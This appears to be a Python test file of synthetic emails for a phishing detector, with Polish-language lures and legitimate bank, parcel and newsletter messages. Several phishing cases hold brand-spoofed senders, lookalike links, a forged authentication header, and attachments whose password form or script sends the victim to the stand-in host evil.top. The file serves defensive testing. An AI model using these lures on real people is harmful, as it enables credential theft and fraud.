"""Synthetic regression corpus: phishing that must be caught, legitimate mail
that must stay quiet. No real people's mail. Add a case for every miss or false
alarm found in practice.
"""
from __future__ import annotations

import base64
from dataclasses import dataclass

GMAIL_RECEIVED = "Received: from mx.sender.example (192.0.2.10) by mx.google.com with ESMTPS id x1\n"


@dataclass(frozen=True)
class Case:
    name: str
    raw: str
    expected: str  # minimal verdict: "SAFE" means must be SAFE
    must_have: tuple[str, ...] = ()


def _encrypted_zip() -> bytes:
    """A ZIP whose entry is flagged as encrypted (content is irrelevant)."""
    import io
    import zipfile

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("faktura.pdf", b"x")
    data = bytearray(buffer.getvalue())
    # General purpose bit flag 0 = encrypted: local header offset 6,
    # central directory header offset 8.
    data[6] |= 0x01
    central = data.find(b"PK\x01\x02")
    data[central + 8] |= 0x01
    return bytes(data)


def _auth(spf="pass", dkim="pass", dmarc="pass", extra=""):
    return (
        f"Authentication-Results: mx.google.com; spf={spf} smtp.mailfrom=x; "
        f"dkim={dkim} header.d=x; dmarc={dmarc} header.from=x{extra}\n"
    )


def message(headers: str, html: str | None = None, text: str | None = None,
            attachments: tuple[tuple[str, str, bytes], ...] = ()) -> str:
    body_parts = []
    if text is not None:
        body_parts.append(("text/plain", text))
    if html is not None:
        body_parts.append(("text/html", html))

    out = [headers.rstrip("\n"), "Message-ID: <case@example>", "MIME-Version: 1.0",
           'Content-Type: multipart/mixed; boundary="B"', "", "--B"]
    for index, (ctype, body) in enumerate(body_parts):
        if index:
            out.append("--B")
        out += [f"Content-Type: {ctype}; charset=utf-8", "", body]
    for name, ctype, data in attachments:
        out += ["--B", f"Content-Type: {ctype}",
                f'Content-Disposition: attachment; filename="{name}"',
                "Content-Transfer-Encoding: base64", "",
                base64.b64encode(data).decode()]
    out.append("--B--")
    return "\n".join(out) + "\n"


PHISHING = [
    Case(
        "forged_authentication_results",
        message(
            "Authentication-Results: mx.google.com; spf=softfail smtp.mailfrom=evil.top\n"
            "Authentication-Results: fake.relay; dkim=pass header.d=paypal.com; dmarc=pass\n"
            + GMAIL_RECEIVED +
            "From: PayPal <service@paypa1-secure.top>\nReply-To: x@gmail.com\n"
            "Return-Path: <b@evil.top>\nSubject: Twoje konto\n",
            html='<a href="https://paypa1-secure.top/login">Zaloguj</a>',
        ),
        "DANGEROUS",
        ("AUTH_FORGED_RESULTS", "SENDER_BRAND_NAME_SPOOF"),
    ),
    Case(
        "bank_display_name_and_link_text",
        message(
            _auth() + GMAIL_RECEIVED +
            'From: "mBank S.A." <powiadomienia@mbank-pl-weryfikacja.com>\n'
            "Subject: Pilne: konto zostanie zablokowane\n",
            html='<p>Potwierdz dane w ciagu 24 godzin.</p>'
                 '<a href="https://mbank-pl-weryfikacja.com/logowanie">https://www.mbank.pl</a>',
        ),
        "DANGEROUS",
        ("SENDER_BRAND_NAME_SPOOF", "URL_TEXT_MISMATCH", "URL_BRAND_IMITATION"),
    ),
    Case(
        "parcel_fee_blik",
        message(
            _auth() + GMAIL_RECEIVED +
            "From: InPost <info@inpost-paczka24.xyz>\n"
            "Subject: Paczka wstrzymana - doplata 1,99 zl\n",
            html='<p>Twoja paczka czeka. Oplac doplata przez BLIK.</p>'
                 '<a href="https://inpost-paczka24.xyz/doplata?blik=1">Zaplac BLIK</a>',
        ),
        "DANGEROUS",
        ("SENDER_BRAND_NAME_SPOOF", "URL_BRAND_IMITATION", "CONTENT_LURE"),
    ),
    Case(
        "lookalike_link_only",
        message(
            _auth() + GMAIL_RECEIVED + "From: a@newsletter.example.org\nSubject: hi\n",
            html='<a href="https://micros0ft.com/login">Microsoft 365</a>',
        ),
        "SUSPICIOUS",
        ("URL_BRAND_IMITATION",),
    ),
    Case(
        "html_attachment_with_password_form",
        message(
            _auth() + GMAIL_RECEIVED + "From: a@firma.example.org\nSubject: Faktura\n",
            text="W zalaczniku faktura.",
            attachments=(("Faktura_0923.html", "text/html",
                          b"<form action='https://evil.top/p'><input type=password></form>"),),
        ),
        "DANGEROUS",
        ("ATTACHMENT_HTML_ACTIVE",),
    ),
    Case(
        "svg_attachment_with_script",
        message(
            _auth() + GMAIL_RECEIVED + "From: a@firma.example.org\nSubject: Voicemail\n",
            text="Odsluchaj wiadomosc.",
            attachments=(("voicemail.svg", "image/svg+xml",
                          b"<svg><script>location='https://evil.top'</script></svg>"),),
        ),
        "DANGEROUS",
        ("ATTACHMENT_HTML_ACTIVE",),
    ),
    Case(
        "com_pl_domains_are_not_one_company",
        message(
            "Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=atak.com.pl\n"
            + GMAIL_RECEIVED +
            "From: Allegro <a@allegro-pomoc.com.pl>\nReturn-Path: <x@atak.com.pl>\n"
            "Reply-To: r@inny.com.pl\nSubject: Zamowienie\n",
            text="Sprawdz zamowienie.",
        ),
        "DANGEROUS",
        ("SENDER_MISMATCH", "SENDER_BRAND_NAME_SPOOF"),
    ),
    Case(
        "no_authentication_brand_name_user_content_host",
        message(
            GMAIL_RECEIVED + 'From: "Microsoft 365" <it@random-domain.xyz>\n'
            "Subject: Haslo wygasa dzisiaj\n",
            html='<a href="https://sites.google.com/view/ms365-login">Odnow haslo</a>',
        ),
        "DANGEROUS",
        ("SENDER_BRAND_NAME_SPOOF", "AUTH_MISSING"),
    ),
    Case(
        "executable_disguised_as_pdf",
        message(
            _auth() + GMAIL_RECEIVED + "From: a@firma.example.org\nSubject: Umowa\n",
            text="Umowa w zalaczniku.",
            attachments=(("Umowa.pdf", "application/pdf", b"MZ\x90\x00rest"),),
        ),
        "DANGEROUS",
        ("ATTACHMENT_EXECUTABLE",),
    ),
    Case(
        "password_protected_zip",
        message(
            _auth() + GMAIL_RECEIVED + "From: a@firma.example.org\nSubject: Dokumenty\n",
            text="Haslo do archiwum: 1234",
            attachments=(("dokumenty.zip", "application/zip",
                          _encrypted_zip()),),
        ),
        "SUSPICIOUS",
        ("ATTACHMENT_ENCRYPTED_ARCHIVE",),
    ),
    Case(
        "redirect_to_lookalike",
        message(
            _auth() + GMAIL_RECEIVED + "From: a@news.example.org\nSubject: Oferta\n",
            html='<a href="https://track.example.net/r?u=https%3A%2F%2Fpaypa1.com%2Flogin">Kliknij</a>',
        ),
        "SUSPICIOUS",
        ("URL_REDIRECT_TO_SUSPICIOUS",),
    ),
]


LEGITIMATE = [
    Case(
        "google_security_alert",
        message(
            _auth() + GMAIL_RECEIVED +
            "From: Google <no-reply@accounts.google.com>\n"
            "Return-Path: <x@scoutcamp.bounces.google.com>\nSubject: Alert bezpieczenstwa\n",
            html='<a href="https://accounts.google.com/AccountChooser?continue=https://myaccount.google.com/notifications">'
                 "Sprawdz aktywnosc</a>",
        ),
        "SAFE",
    ),
    Case(
        "allegro_newsletter_via_tracking",
        message(
            _auth() + GMAIL_RECEIVED +
            "From: Allegro <newsletter@allegromail.pl>\nReturn-Path: <b@bounce.allegromail.pl>\n"
            "Subject: Okazje tygodnia\n",
            html='<a href="https://click.allegromail.pl/ls/click?upn=abc">www.allegro.pl</a>'
                 '<a href="https://allegro.pl/kategoria/x">Zobacz</a>',
        ),
        "SAFE",
    ),
    Case(
        "inpost_real_notification",
        message(
            _auth() + GMAIL_RECEIVED +
            "From: InPost <powiadomienia@inpost.pl>\nSubject: Paczka czeka w Paczkomacie\n",
            html='<a href="https://inpost.pl/sledzenie-przesylek?number=123">Sledz paczke</a>',
        ),
        "SAFE",
    ),
    Case(
        "shop_newsletter_esp_link",
        message(
            _auth() + GMAIL_RECEIVED +
            "From: Sklep <news@sklep.example.pl>\nReturn-Path: <b@bounces.esp.example.net>\n"
            "Subject: Nowosci\n",
            html='<a href="https://links.esp.example.net/c/abc">www.sklep.example.pl</a>',
        ),
        "SAFE",
    ),
    Case(
        "bank_real_statement",
        message(
            _auth() + GMAIL_RECEIVED +
            "From: mBank <kontakt@mbank.pl>\nSubject: Wyciag za wrzesien\n",
            html='<p>Zaloguj sie do serwisu, aby zobaczyc wyciag.</p>'
                 '<a href="https://www.mbank.pl/indywidualny/">https://www.mbank.pl</a>',
        ),
        "SAFE",
    ),
    Case(
        "invoice_pdf_from_known_company",
        message(
            _auth() + GMAIL_RECEIVED +
            "From: Faktury <faktury@operator.example.pl>\nSubject: Faktura 09/2026\n",
            text="W zalaczniku faktura za wrzesien.",
            attachments=(("faktura.pdf", "application/pdf", b"%PDF-1.7\n1 0 obj<<>>endobj\n"),),
        ),
        "SAFE",
    ),
    Case(
        "docs_share_from_colleague",
        message(
            _auth() + GMAIL_RECEIVED +
            'From: "Jan Kowalski (via Google Docs)" <drive-shares-dm-noreply@google.com>\n'
            "Subject: Udostepniony dokument\n",
            html='<a href="https://docs.google.com/document/d/abc/edit">Otworz</a>',
        ),
        "SAFE",
    ),
]
